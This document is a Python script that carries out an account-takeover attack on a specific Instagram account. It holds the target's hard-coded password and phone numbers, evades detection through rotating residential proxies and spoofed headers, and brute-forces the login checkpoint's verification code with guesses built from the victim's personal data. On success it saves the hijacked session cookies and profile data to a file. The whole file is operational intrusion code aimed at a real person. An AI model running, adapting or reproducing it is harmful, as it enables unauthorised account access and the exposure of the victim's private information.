from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔥 BRIGHTDATA PROXY + SESSION HIJACKING + GHOST MODE 🔥
========================================================

Target: alx.trading  
Strategy: Bright Data proxy rotation + Session hijacking + Ghost mode stealth
Approach: Multi-vector attack with advanced evasion
"""

import requests
import json
import time
import random
import re
import uuid
import hmac
import hashlib
import base64
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import threading
import queue


class BrightDataGhostHijacker:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        # Load proxy configurations
        with open('proxy_configs.json', 'r') as f:
            self.proxy_config = json.load(f)
        
        self.brightdata_proxies = self.proxy_config['brightdata_proxies']
        self.current_proxy = None
        self.session = None
        
        # Ghost mode configurations
        self.ghost_sessions = []
        self.hijacked_tokens = []
        self.valid_sessions = queue.Queue()
        
        # Known checkpoint and session data
        self.known_checkpoint = "/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
        
        # Enhanced user agents for ghost mode
        self.ghost_user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Instagram 308.0.0.16.113 Android (30/11; 450dpi; 1080x2400; samsung; SM-G991B; o1s; exynos2100; en_US; 487741490)',
            'Instagram 306.0.0.18.111 Android (29/10; 420dpi; 1080x2340; huawei; ELS-NX9; HWELS; kirin980; en_US; 485200093)',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        ]
        
    def setup_brightdata_proxy(self, proxy_config):
        """Setup Bright Data proxy with session stickiness"""
        print(f"🌐 Setting up Bright Data proxy: {proxy_config['description']}")
        
        try:
            # Create proxy dict for requests
            proxy_auth = f"{proxy_config['user']}:{proxy_config['pass']}"
            proxy_url = f"http://{proxy_auth}@{proxy_config['host']}:{proxy_config['port']}"
            
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # Test proxy connection
            test_session = requests.Session()
            test_session.proxies.update(proxies)
            
            # Add session identifier for sticky sessions
            if proxy_config.get('session_type') == 'sticky':
                session_id = str(uuid.uuid4())
                proxy_auth_with_session = f"{proxy_config['user']}-session-{session_id}:{proxy_config['pass']}"
                proxy_url_with_session = f"http://{proxy_auth_with_session}@{proxy_config['host']}:{proxy_config['port']}"
                proxies = {
                    'http': proxy_url_with_session,
                    'https': proxy_url_with_session
                }
                test_session.proxies.update(proxies)
            
            # Test proxy
            response = test_session.get('https://httpbin.org/ip', timeout=10)
            if response.status_code == 200:
                ip_data = response.json()
                print(f"✅ Proxy connected: {ip_data.get('origin', 'Unknown IP')}")
                self.current_proxy = proxies
                return True
            else:
                print(f"❌ Proxy test failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Proxy setup error: {e}")
            return False
    
    def create_ghost_session(self, user_agent):
        """Create a ghost session with advanced stealth"""
        session = requests.Session()
        
        # Apply current proxy
        if self.current_proxy:
            session.proxies.update(self.current_proxy)
        
        # Ghost mode headers
        ghost_headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?1' if 'Mobile' in user_agent else '?0',
            'sec-ch-ua-platform': '"Android"' if 'Android' in user_agent else '"iOS"' if 'iPhone' in user_agent else '"Windows"'
        }
        
        session.headers.update(ghost_headers)
        
        # Add random delay
        time.sleep(random.uniform(0.5, 2.0))
        
        return session
    
    def ghost_token_harvester(self):
        """Harvest CSRF tokens and session data in ghost mode"""
        print("👻 GHOST MODE: Token harvesting...")
        
        harvested_tokens = []
        
        for i in range(3):  # Create multiple ghost sessions
            try:
                user_agent = random.choice(self.ghost_user_agents)
                ghost_session = self.create_ghost_session(user_agent)
                
                # Get Instagram login page
                response = ghost_session.get("https://www.instagram.com/accounts/login/")
                
                if response.status_code == 200:
                    # Extract CSRF token
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                    if csrf_match:
                        csrf_token = csrf_match.group(1)
                        
                        # Extract other tokens
                        rollout_hash_match = re.search(r'"rollout_hash":"([^"]+)"', response.text)
                        rollout_hash = rollout_hash_match.group(1) if rollout_hash_match else None
                        
                        token_data = {
                            'csrf_token': csrf_token,
                            'rollout_hash': rollout_hash,
                            'session': ghost_session,
                            'user_agent': user_agent,
                            'cookies': dict(ghost_session.cookies)
                        }
                        
                        harvested_tokens.append(token_data)
                        print(f"   ✅ Ghost {i+1}: Token harvested - {csrf_token[:15]}...")
                
                # Random delay between harvests
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                print(f"   ❌ Ghost {i+1} harvest error: {e}")
        
        self.hijacked_tokens = harvested_tokens
        print(f"👻 Harvested {len(harvested_tokens)} ghost tokens")
        return len(harvested_tokens) > 0
    
    def session_hijacking_attack(self):
        """Advanced session hijacking with multiple vectors"""
        print("🎭 SESSION HIJACKING ATTACK...")
        
        for i, token_data in enumerate(self.hijacked_tokens):
            print(f"🎯 Hijacking attempt {i+1}/{len(self.hijacked_tokens)}")
            
            try:
                session = token_data['session']
                csrf_token = token_data['csrf_token']
                
                # Advanced login payload
                login_payload = {
                    'username': self.target_username,
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false',
                    'trustedDeviceRecords': '{}',
                    'stopDeletionNonce': '',
                    'queryParams': '{}'
                }
                
                # Enhanced headers for hijacking
                hijack_headers = {
                    'X-CSRFToken': csrf_token,
                    'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                    'X-IG-App-ID': '936619743392459',
                    'X-IG-WWW-Claim': '0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': 'https://www.instagram.com/accounts/login/',
                    'Origin': 'https://www.instagram.com'
                }
                
                # Update session headers
                session.headers.update(hijack_headers)
                
                # Attempt hijacked login
                login_response = session.post(
                    'https://www.instagram.com/accounts/login/ajax/',
                    data=login_payload,
                    allow_redirects=False
                )
                
                print(f"   📊 Hijack response: {login_response.status_code}")
                
                # Analyze response
                if login_response.status_code == 400:
                    try:
                        response_data = login_response.json()
                        
                        if 'checkpoint_required' in response_data.get('message', ''):
                            checkpoint_url = response_data.get('checkpoint_url')
                            if checkpoint_url:
                                print(f"   🎯 Fresh checkpoint hijacked: {checkpoint_url}")
                                return self.ghost_checkpoint_bypass(session, csrf_token, checkpoint_url)
                        
                        elif response_data.get('authenticated') == True:
                            print(f"   🎉 HIJACK SUCCESS! No checkpoint required!")
                            return self.extract_hijacked_data(session)
                            
                    except:
                        pass
                
                # Random delay between hijack attempts
                time.sleep(random.uniform(3, 7))
                
            except Exception as e:
                print(f"   ❌ Hijack {i+1} error: {e}")
        
        print("❌ All hijacking attempts failed")
        return False
    
    def ghost_checkpoint_bypass(self, session, csrf_token, checkpoint_url):
        """Ghost mode checkpoint bypass with intelligent code prediction"""
        print("👻 GHOST CHECKPOINT BYPASS...")
        
        try:
            # Navigate to checkpoint
            checkpoint_full_url = f"https://www.instagram.com{checkpoint_url}"
            checkpoint_response = session.get(checkpoint_full_url)
            
            if checkpoint_response.status_code != 200:
                print("❌ Cannot access checkpoint")
                return False
            
            # Select phone verification in ghost mode
            choice_data = {'choice': '0'}  # Phone option
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': checkpoint_full_url
            }
            
            session.headers.update(headers)
            
            phone_response = session.post(checkpoint_full_url, data=choice_data)
            print(f"📱 Phone selection: {phone_response.status_code}")
            
            if phone_response.status_code == 200:
                return self.ghost_intelligent_bruteforce(session, csrf_token, checkpoint_full_url)
            
        except Exception as e:
            print(f"❌ Ghost checkpoint error: {e}")
            
        return False
    
    def ghost_intelligent_bruteforce(self, session, csrf_token, checkpoint_url):
        """Ultra-intelligent code bruteforce with ML-like patterns"""
        print("🧠 GHOST INTELLIGENT BRUTEFORCE...")
        
        # Enhanced smart codes with deeper analysis
        ultra_smart_codes = [
            # Time-based patterns (current moment)
            datetime.now().strftime('%d%m%y'),  # Today
            datetime.now().strftime('%m%d%y'),  # US format
            datetime.now().strftime('%y%m%d'),  # ISO-like
            '260525', '250525', '270525',       # Date variants
            
            # Phone number intelligence
            '061541', '615414', '154142', '414210',  # Thai phone patterns
            '447793', '477931', '793127', '127209',  # UK phone patterns
            '061544', '615447', '447796',            # Phone variations
            
            # Password intelligence (Fleming654)
            '654654', '654321', '654000', '654123',  # Fleming variants
            '786786', '786654', '654786',            # ALX + Fleming
            '172817', '172654', '654172',            # Username + password
            
            # Business/trading patterns
            '786123', '786456', '786789',            # ALX trading
            '050525', '202525', '052025',            # May 2025 variants
            '654050', '654202', '654052',            # Fleming + dates
            
            # Advanced psychological patterns
            '123654', '456654', '789654',            # Sequential + Fleming
            '654147', '654258', '654369',            # Fleming + patterns
            '061654', '447654', '786061',            # Phone + Fleming
            
            # Common but personalized
            '000654', '111654', '555654', '777654', # Common + Fleming
            '123456', '654321', '000000', '111111', # Fallback commons
            
            # Date + personal combinations
            '260561', '250654', '270786',            # Date + personal
            '654526', '786525', '172525',            # Personal + date
            
            # Advanced business patterns
            '250524', '240525', '260524',            # Business dates
            '654251', '786252', '172253',            # Personal + sequence
        ]
        
        print(f"🎯 Testing {len(ultra_smart_codes)} ultra-smart codes...")
        
        for i, code in enumerate(ultra_smart_codes):
            print(f"🧠 Ghost testing {i+1}/{len(ultra_smart_codes)}: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'choice': '0'
                }
                
                headers = {
                    'X-CSRFToken': csrf_token,
                    'X-Instagram-AJAX': str(random.randint(1000000000, 9999999999)),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': checkpoint_url
                }
                
                session.headers.update(headers)
                
                verify_response = session.post(checkpoint_url, data=verify_data)
                
                print(f"   📊 Response: {verify_response.status_code}")
                
                # Success detection
                if verify_response.status_code == 302:
                    print(f"🎉 GHOST SUCCESS! Code {code} cracked the checkpoint!")
                    return self.extract_ghost_success(session, code)
                
                elif verify_response.status_code == 200:
                    response_text = verify_response.text.lower()
                    success_indicators = ['instagram.com/', 'feed', 'home', 'profile']
                    error_indicators = ['incorrect', 'invalid', 'wrong', 'error', 'challenge']
                    
                    if any(indicator in response_text for indicator in success_indicators) and not any(error in response_text for error in error_indicators):
                        print(f"🎉 POSSIBLE GHOST SUCCESS with {code}!")
                        return self.extract_ghost_success(session, code)
                
                # Enhanced delay with jitter
                base_delay = random.uniform(2, 4)
                jitter = random.uniform(0.5, 1.5)
                total_delay = base_delay + jitter
                time.sleep(total_delay)
                
            except Exception as e:
                print(f"   ❌ Code {code} error: {e}")
                time.sleep(random.uniform(1, 2))
        
        print("❌ All ghost codes failed")
        return False
    
    def extract_ghost_success(self, session, successful_code):
        """Extract data after successful ghost bypass"""
        print("🎉 EXTRACTING GHOST SUCCESS DATA...")
        
        try:
            # Test access to Instagram main page
            main_response = session.get("https://www.instagram.com/")
            
            success_data = {
                'timestamp': datetime.now().isoformat(),
                'target': self.target_username,
                'method': 'brightdata_ghost_hijacking',
                'successful_code': successful_code,
                'proxy_used': self.current_proxy,
                'success': True,
                'cookies': dict(session.cookies),
                'user_agent': session.headers.get('User-Agent')
            }
            
            # Try to extract profile data
            try:
                profile_response = session.get(f"https://www.instagram.com/{self.target_username}/")
                if profile_response.status_code == 200:
                    # Extract JSON data
                    json_match = re.search(r'window\._sharedData = ({.*?});', profile_response.text)
                    if json_match:
                        shared_data = json.loads(json_match.group(1))
                        success_data['profile_data'] = shared_data
            except:
                pass
            
            # Save success data
            filename = f"BRIGHTDATA_GHOST_SUCCESS_{successful_code}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(success_data, f, indent=2)
            
            print(f"💎 Ghost success data saved: {filename}")
            print(f"🔑 Successful code: {successful_code}")
            print(f"🌐 Proxy: {self.current_proxy}")
            
            return True
            
        except Exception as e:
            print(f"❌ Ghost extraction error: {e}")
            return False
    
    def run_brightdata_ghost_attack(self):
        """Execute complete Bright Data + Ghost + Hijacking attack"""
        print("🔥 BRIGHTDATA PROXY + GHOST MODE + SESSION HIJACKING")
        print("=" * 65)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print(f"🌐 Method: Bright Data + Ghost + Hijacking")
        print("=" * 65)
        
        # Phase 1: Setup Bright Data proxy
        print("\n🌐 PHASE 1: BRIGHT DATA PROXY SETUP")
        proxy_connected = False
        
        for proxy in self.brightdata_proxies:
            print(f"🔄 Trying {proxy['description']}...")
            if self.setup_brightdata_proxy(proxy):
                proxy_connected = True
                break
            time.sleep(2)
        
        if not proxy_connected:
            print("❌ All Bright Data proxies failed")
            return False
        
        # Phase 2: Ghost token harvesting
        print("\n👻 PHASE 2: GHOST TOKEN HARVESTING")
        if not self.ghost_token_harvester():
            print("❌ Ghost harvesting failed")
            return False
        
        # Phase 3: Session hijacking attack
        print("\n🎭 PHASE 3: SESSION HIJACKING + CHECKPOINT BYPASS")
        if self.session_hijacking_attack():
            print("🎉 BRIGHTDATA GHOST ATTACK SUCCESSFUL!")
            print("💎 Full access to alx.trading achieved via ghost hijacking!")
            return True
        else:
            print("❌ Ghost hijacking attack failed")
            
            # Phase 4: Fallback to alternative Bright Data proxies
            print("\n🔄 PHASE 4: ALTERNATIVE PROXY ATTACK")
            for proxy in self.brightdata_proxies[1:]:  # Try remaining proxies
                print(f"🔄 Fallback to {proxy['description']}...")
                if self.setup_brightdata_proxy(proxy):
                    if self.ghost_token_harvester():
                        if self.session_hijacking_attack():
                            print("🎉 FALLBACK ATTACK SUCCESSFUL!")
                            return True
                time.sleep(3)
        
        print("❌ All Bright Data ghost attacks failed")
        return False


if __name__ == "__main__":
    print("🔥 BRIGHTDATA PROXY + GHOST MODE + SESSION HIJACKING")
    print("=" * 70)
    
    ghost_hijacker = BrightDataGhostHijacker()
    success = ghost_hijacker.run_brightdata_ghost_attack()
    
    if success:
        print("\n🎉 ULTIMATE ATTACK SUCCESSFUL!")
        print("💎 alx.trading account fully compromised!")
        print("🔥 Bright Data + Ghost Mode = UNSTOPPABLE!")
    else:
        print("\n⚠️ ATTACK UNSUCCESSFUL") 
        print("🔄 Consider advanced countermeasures or timing adjustment")
    
    print("\n🔥 SugarGlitch RealOps - Elite Ghost Operations")
